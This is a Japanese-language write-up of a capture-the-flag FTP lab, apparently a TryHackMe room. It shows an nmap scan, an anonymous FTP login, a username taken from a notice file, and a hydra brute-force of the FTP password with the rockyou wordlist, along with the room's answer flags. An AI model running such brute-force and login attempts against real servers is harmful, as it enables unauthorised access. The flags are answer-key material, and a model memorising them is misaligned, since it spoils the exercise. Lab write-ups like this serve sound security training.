## 1.環　境
- ターゲットIP：10.10.119.98  
  
## 2.戦　略
### 2-1.サーバーの状態を列挙
- ユーザ名
- Anonymousユーザの存在
- 各バージョン情報
  
### 2-2.侵　入
- パスワードクラック
- バージョンの脆弱性を突く侵入
- 認証情報取得の上侵入
  
## 3.実　施
### 3-1.ターゲットマシン上で開いている  ポートの数はいくつですか?
- `nmap -A`を実行  
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.10.119.98                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 04:47 JST
Nmap scan report for 10.10.119.98
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.25 seconds

```
flag:`2`
  
### 3-2.ftp はどのポートで実行されていますか?
- `nmap -A`の結果から
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
```
flag:`21`
  
### 3-3.どのような種類の FTP が実行されていますか? 
- `nmap -A`の結果から
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
```
flag:`vsftpd`
  
### 3-4.FTP サーバーにAnonymousログインできるかどうかを確認。FTP ディレクトリ内のファイルの名前は何ですか?
- `Anonymous`ログイン試行
- `ls`でディレクトリ表示
```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.119.98
Connected to 10.10.119.98.
220 Welcome to the administrator FTP service.
Name (10.10.119.98:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
```bash
ftp> ls
229 Entering Extended Passive Mode (|||50076|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
226 Directory send OK.
```
flag:`PUBLIC_NOTICE.txt`
  
### 3-5.ユーザー名として考えられるものは何でしょうか?
- `PUBLIC_NOTICE.txt`を`get`
- ローカルで`PUBLIC_NOTICE.txt`を表示
```bash
ftp> get PUBLIC_NOTICE.txt
local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
229 Entering Extended Passive Mode (|||50866|)
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
100% |***********************************************************************************************************************************************************************************************|   353        3.65 MiB/s    00:00 ETA
226 Transfer complete.
353 bytes received in 00:00 (1.37 KiB/s)
ftp> exit
221 Goodbye.

```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PUBLIC_NOTICE.txt
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
```
おそらく何かのメモと思料。  
`Mike`が名前っぽいのでsubmitしたらクリア  
  
flag:`Mike`
  
### 3-6.ユーザー「mike」のパスワードは何ですか?
- ユーザ名`Mike`を取得できているので、`hydra`でパスワードクラックできないか試してみる
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.119.98 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-10 05:00:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.119.98:21/
[21][ftp] host: 10.10.119.98   login: mike   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-10 05:00:40

```
- `-l`：ユーザ名の指定
- `-P`：パスワードリストの指定
- `/usr/share/wordlist/rockyou.txt`：`hydra`や`gobuster`などで頻出のパスワードリスト。まずはこれってやつ
  
`[21][ftp] host: 10.10.119.98   login: mike   password: password`でパスワードクラックに成功  
ユーザ名が既知ならクラックしやすい（感覚）  
  
flag:`password`


### 3-7.FTPサーバーに接続し、ftp.txtを探索。中身を答えよ。
- ユーザ名`mike`、パスワード`password`でログイン
- `ls`でディレクトリを確認し、`get`で`ftp.txt`をローカルにダウンロード
- ローカルに戻り、`cat`で中身を出力
```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.119.98
Connected to 10.10.119.98.
220 Welcome to the administrator FTP service.
Name (10.10.119.98:kali): mike
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
```bash
ftp> ls
229 Entering Extended Passive Mode (|||32343|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
-rw-r--r--    1 1002     1006            0 Jun 09 19:40 test.txt
226 Directory send OK.
```
```bash
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
229 Entering Extended Passive Mode (|||25104|)
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
100% |***********************************************************************************************************************************************************************************************|    26      298.71 KiB/s    00:00 ETA
226 Transfer complete.
26 bytes received in 00:00 (0.09 KiB/s)
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat ftp.txt          
THM{y0u_g0t_th3_ftp_fl4g}
```
  
flag:`THM{y0u_g0t_th3_ftp_fl4g}`  
  
